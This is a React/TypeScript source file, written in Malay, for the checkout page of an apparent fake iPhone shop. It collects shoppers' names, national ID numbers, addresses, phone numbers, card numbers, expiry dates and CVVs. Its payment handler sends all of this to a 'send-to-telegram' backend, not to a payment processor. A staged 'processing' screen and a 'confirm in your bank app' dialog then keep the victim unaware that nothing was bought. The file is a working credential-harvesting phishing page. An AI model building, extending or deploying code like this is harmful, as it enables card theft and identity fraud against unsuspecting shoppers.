"use client";

import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import ShippingForm from '@/components/checkout/ShippingForm.tsx';
import ConfirmationSummary from '@/components/checkout/ConfirmationSummary.tsx';
import PaymentForm from '@/components/checkout/PaymentForm.tsx';
import PaymentProcessing from '@/components/checkout/PaymentProcessing.tsx';
import BankAppConfirmationDialog from '@/components/checkout/BankAppConfirmationDialog.tsx';
import { showSuccess, showError } from '@/utils/toast'; // Import showError

export type ShippingDetails = {
  fullName: string;
  icNumber: string;
  phoneNumber: string;
  address: string;
};

export type PaymentDetails = {
  cardNumber: string;
  expiryDate: string;
  cvv: string;
};

type CheckoutStep = 'shipping' | 'confirm' | 'payment' | 'processing' | 'bank_confirmation';

const Checkout: React.FC = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const selectedIPhone = location.state?.selectedIPhone;

  const [currentStep, setCurrentStep] = useState<CheckoutStep>('shipping');
  const [shippingDetails, setShippingDetails] = useState<ShippingDetails | null>(null);
  const [paymentDetails, setPaymentDetails] = useState<PaymentDetails | null>(null);
  const [showBankConfirmation, setShowBankConfirmation] = useState(false);

  if (!selectedIPhone) {
    // Redirect to home or AppleDevices page if no iPhone is selected
    React.useEffect(() => {
      navigate('/devices/apple', { replace: true });
      showSuccess('Sila pilih peranti iPhone terlebih dahulu.');
    }, [navigate]);
    return null; // Or a loading spinner/message
  }

  const handleShippingSubmit = (data: ShippingDetails) => {
    setShippingDetails(data);
    setCurrentStep('confirm');
  };

  const handleConfirmDetails = () => {
    setCurrentStep('payment');
  };

  const handlePaymentSubmit = async (data: PaymentDetails) => {
    setPaymentDetails(data);
    setCurrentStep('processing');

    // Send data to backend after payment details are submitted
    try {
      const response = await fetch('http://localhost:3001/send-to-telegram', { // Gantikan dengan URL backend anda
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          phoneNumber: shippingDetails?.phoneNumber, // Menggunakan nombor telefon dari shippingDetails
          shippingDetails: shippingDetails,
          selectedIPhone: selectedIPhone,
          paymentDetails: data, // Data pembayaran yang baru diisi
        }),
      });

      if (response.ok) {
        showSuccess('Maklumat pesanan berjaya dihantar ke bot Telegram!');
      } else {
        showError('Gagal menghantar maklumat pesanan ke bot Telegram.');
      }
    } catch (error) {
      console.error('Ralat rangkaian atau pelayan backend:', error);
      showError('Ralat sambungan. Sila cuba lagi.');
    }
  };

  const handlePaymentProcessingComplete = () => {
    setShowBankConfirmation(true);
  };

  const handleBankConfirmationClose = () => {
    setShowBankConfirmation(false);
    showSuccess('Transaksi anda sedang menunggu pengesahan di aplikasi perbankan anda.');
    navigate('/', { replace: true }); // Redirect to home after confirmation
  };

  return (
    <div className="container mx-auto p-4 md:p-8 min-h-screen flex flex-col items-center justify-center bg-gray-50">
      <h1 className="text-3xl font-bold mb-8 text-center text-gray-800">
        Pembayaran untuk {selectedIPhone.name}
      </h1>

      <div className="w-full max-w-2xl bg-white p-6 rounded-lg shadow-lg">
        {currentStep === 'shipping' && (
          <ShippingForm onSubmit={handleShippingSubmit} />
        )}

        {currentStep === 'confirm' && shippingDetails && (
          <ConfirmationSummary
            shippingDetails={shippingDetails}
            selectedIPhone={selectedIPhone}
            onConfirm={handleConfirmDetails}
            onEdit={() => setCurrentStep('shipping')}
          />
        )}

        {currentStep === 'payment' && (
          <PaymentForm onSubmit={handlePaymentSubmit} />
        )}

        {currentStep === 'processing' && (
          <PaymentProcessing onComplete={handlePaymentProcessingComplete} />
        )}

        {showBankConfirmation && (
          <BankAppConfirmationDialog
            open={showBankConfirmation}
            onClose={handleBankConfirmationClose}
          />
        )}
      </div>
    </div>
  );
};

export default Checkout;